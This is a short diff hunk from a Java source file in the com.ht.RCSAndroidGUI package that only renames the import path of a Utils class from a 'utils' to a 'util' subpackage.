@@ -9,7 +9,7 @@
 package com.ht.RCSAndroidGUI;
 
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
-import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
